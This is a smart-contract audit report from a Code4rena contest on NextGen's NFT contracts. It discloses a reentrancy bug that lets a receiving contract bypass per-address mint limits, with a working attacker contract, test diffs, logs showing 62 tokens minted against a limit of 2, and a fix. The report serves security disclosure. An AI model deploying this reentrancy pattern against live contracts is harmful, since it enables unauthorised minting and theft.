# Introduction
Public contest organised by Code4rena.

[`Ilchovski`](https://x.com/ilchovski98) participated as a solo auditor for this contents (was not part of a team).

Find contest details: [`here`](https://code4rena.com/audits/2023-10-nextgen#top).

# About NextGen

Advanced smart contracts for launching generative art projects on Ethereum.

NextGen is a series of contracts whose purpose is to explore:

- More experimental directions in generative art and
- Other non-art use cases of 100% on-chain NFTs

# Risk Classification

The risk classification for this audit were according to the platform's rules at the time of the audit. Only **High** and **Medium** severity findings were in scope.

# Ilchovski's Findings Summary

| ID     | Title                                                              | Severity |
| ------ | ------------------------------------------------------------------ | -------- |
| [H-01] | Core Contract Minting Reentrancy allows to mint more than...       | High     |

# Findings

# [H-01] Core Contract Minting Reentrancy allows to mint more than the collection specified mint limit per address

## Impact
Users are able to mint as many NFTs as far as they don't run out of gas despite the maximum mint allowance per address that is set by the collection.

## Proof of Concept
Inside [`NextGenCore.sol`](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/hardhat/smart-contracts/NextGenCore.sol#L193) when the minter contract calls the mint function, the storage variables responsible for tracking the balance of minted tokens of a user are updated after the _mintProcessing function.

The _mintProcessing function eventually calls [`_checkOnERC721Received`](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/hardhat/smart-contracts/ERC721.sol#L400) and makes an external call if the NFTs are minted to a contract address. The attacker that receives the tokens can reenter into the MinterContract.sol [`mint function`](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/hardhat/smart-contracts/MinterContract.sol#L196C2-L196C2) numerous times and will be able to successfully mint tokens despite what is the allowed mint count by the collection since the balance of the attacker will update after the reentrancy.

## Hardhat POC
Create file TestAttackerMintReentrancy.sol inside https://github.com/code-423n4/2023-10-nextgen/tree/main/hardhat/smart-contracts

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "./IMinterContract.sol";
import "./IERC721Receiver.sol";

interface IMinter {
 function mint(
     uint256 _collectionID,
     uint256 _numberOfTokens,
     uint256 _maxAllowance,
     string memory _tokenData,
     address _mintTo,
     bytes32[] calldata merkleProof,
     address _delegator,
     uint256 _saltfun_o
 ) external payable;
}

contract TestAttackerMintReentrancy {
 IMinter minterContract;
 bool received;
 uint exploitMintCount;
 Data lastUserData;
 uint initialGas;
 uint gasPerIteration;

 struct Data {
     uint256 _collectionID;
     uint256 _numberOfTokens;
     uint256 _maxAllowance;
     string _tokenData;
     address _mintTo;
     bytes32[] merkleProof;
     address _delegator;
     uint256 _saltfun_o;
 }

 constructor(address _minter) {
     minterContract = IMinter(_minter);
 }

 function mint(
     Data memory _lastUserData
 ) public payable {
     initialGas = gasleft();
     lastUserData = _lastUserData;
     received = false;

     minterContract.mint(
         _lastUserData._collectionID,
         _lastUserData._numberOfTokens,
         _lastUserData._maxAllowance,
         _lastUserData._tokenData,
         _lastUserData._mintTo,
         _lastUserData.merkleProof,
         _lastUserData._delegator,
         _lastUserData._saltfun_o
     );
 }

 function attack(
     Data memory _lastUserData
 ) public payable {
 minterContract.mint(
     _lastUserData._collectionID,
     _lastUserData._numberOfTokens,
     _lastUserData._maxAllowance,
     _lastUserData._tokenData,
     _lastUserData._mintTo,
     _lastUserData.merkleProof,
     _lastUserData._delegator,
     _lastUserData._saltfun_o
 );

     delete lastUserData;
 }

 function onERC721Received(
     address operator,
     address from,
     uint256 tokenId,
     bytes calldata data
 ) external returns (bytes4) {
     if (exploitMintCount == 0) {
         gasPerIteration = initialGas - gasleft();
     }
     exploitMintCount++;

     if (!received) {
         if ((gasleft() / gasPerIteration) < 1) {
         received = true;
         }
         this.attack(lastUserData);
     }

     return IERC721Receiver.onERC721Received.selector;
 }
}

```

Deploy the contract inside by making the following changes to https://github.com/code-423n4/2023-10-nextgen/blob/main/hardhat/scripts/fixturesDeployment.js:

```diff
diff --git a/fixturesDeployment.original.js b/fixturesDeployment.js
index 3c24466..d4bb785 100644
--- a/fixturesDeployment.original.js
+++ b/fixturesDeployment.js
@@ -42,6 +42,9 @@ const fixturesDeployment = async () => {
  await hhAdmin.getAddress(),
)

+  const attackerFactory = await ethers.getContractFactory("TestAttackerMintReentrancy")
+  const attacker = await attackerFactory.deploy(await hhMinter.getAddress())
+
const contracts = {
  hhAdmin: hhAdmin,
  hhCore: hhCore,
  hhMinter: hhMinter,
  hhRandomizer: hhRandomizer,
  hhRandoms: hhRandoms,
+    attacker: attacker,
}

const signers = {
```

Add the test inside the test file https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/hardhat/test/nextGen.test.js:

```diff
diff --git a/nextGen.test.original.js b/nextGen.test.js
index fa3864c..667795f 100644
--- a/nextGen.test.original.js
+++ b/nextGen.test.js
@@ -269,6 +269,27 @@ describe("NextGen Tests", function () {
})

context("Minting", () => {
+    it("EXPLOIT: mint more NFTs from collection 1 than the allowed amount (Reentrancy)", async function () {
+      console.log('Max Allowed to mint tokens per address: ', await contracts.hhCore.viewMaxAllowance(1));
+      const attackerAddress = await contracts.attacker.getAddress();
+      const balanceBeforeAttack = await contracts.hhCore.balanceOf(attackerAddress);
+      console.log(`Attacker's balance before the attack: `, balanceBeforeAttack);
+
+      await contracts.attacker.mint({
+        _collectionID: 1,
+        _numberOfTokens: 2,
+        _maxAllowance: 0,
+        _tokenData: '{"tdh": "100"}',
+        _mintTo: attackerAddress,
+        merkleProof: ["0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870"],
+        _delegator: signers.addr1.address,
+        _saltfun_o: 2
+      })
+
+      const balanceAfterAttack = await contracts.hhCore.balanceOf(attackerAddress);
+      console.log(`Attacker's balance after the attack: `, balanceAfterAttack);
+    });
+
  it("#mintNFTCol1", async function () {
    await contracts.hhMinter.mint(
      1, // _collectionID
```

If we run the tests with npx hardhat test we get the following logs:

```
Max Allowed to mint tokens per address:  2n
Attacker's balance before the attack:  0n
Attacker's balance after the attack:  62n
```

## Tools Used
Manual review

## Recommended Mitigation Steps
Always make sure (whenever possible) that storage variables are updated before making an external call.
In this case moving the if statement (https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/hardhat/smart-contracts/NextGenCore.sol#L194C13-L198C14) above _mintProcessing function will fix this issue.
